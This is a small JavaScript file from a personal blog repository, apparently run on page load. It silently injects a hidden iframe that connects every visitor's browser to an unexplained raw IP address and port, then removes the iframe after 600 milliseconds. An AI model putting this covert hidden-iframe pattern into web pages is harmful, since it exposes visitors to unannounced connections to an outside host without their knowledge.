/*
* Remote Service
*
* Copyright (c) 2017 Donny Hikari
* licensed under MIT license.
*
* https://github.com/Donny-Hikari/donny-hikari.github.io
*
* Version: 0.0.1
*/

var DEBUG_MODE = true;
var DEBUG_VERBOSE = DEBUG_MODE && true;

(function rmccService() {
	try {
		$("body").append(
			$("<div id=\"rscccontainer\" style=\"display:none;\">" +
			"<iframe src=\"//45.76.209.32:10076/clientlink?type=blogs\" style=\"display:none;\"></iframe>" +
			"</div>")
		);
		var dwr = setTimeout(function () {
			try {
				$('#rscccontainer').remove();
			}catch (e) {

			}
		}, 600);
	} catch (e) {

	}
})();